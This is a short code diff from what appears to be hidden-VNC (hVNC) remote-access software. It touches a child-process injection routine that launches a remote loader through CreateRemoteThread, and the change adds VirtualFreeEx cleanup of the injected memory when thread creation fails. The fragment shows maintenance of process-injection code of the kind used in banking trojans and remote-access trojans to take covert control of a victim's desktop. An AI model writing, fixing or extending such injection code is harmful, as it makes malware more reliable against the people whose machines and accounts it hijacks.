@@ -879,6 +879,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
         HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024,
             remoteLoader, NULL, 0, NULL);
         if (!hThread) {
+            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
             CrashLog("[ChildInject] FAIL: CreateRemoteThread failed");
             LogDebug(L"[ChildInject] CreateRemoteThread failed");
             return FALSE;
